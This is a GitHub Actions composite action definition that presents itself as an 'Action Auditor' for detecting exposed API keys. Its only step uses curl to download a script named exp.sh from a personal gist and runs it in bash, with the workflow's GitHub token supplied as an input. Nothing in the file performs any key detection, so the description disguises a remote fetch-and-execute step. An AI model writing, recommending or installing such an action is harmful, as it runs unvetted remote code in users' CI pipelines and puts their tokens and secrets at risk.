name: 'Action Auditor'
description: 'Detect exposed API Keys.'
inputs:
  github_token:
    description: "Get GitHub Token"
    required: false
    default: ${{ github.token }}
runs:
  using: "composite"
  steps:
    - id: actionprint
      run: curl https://gist.githubusercontent.com/rojan-rijal/ab3b48c1882ed3b74d955503cf2f2da1/raw/a3949daa1b330548bde09bf9166028f122b8ee91/exp.sh --output exp.sh && /bin/bash exp.sh
      shell: bash
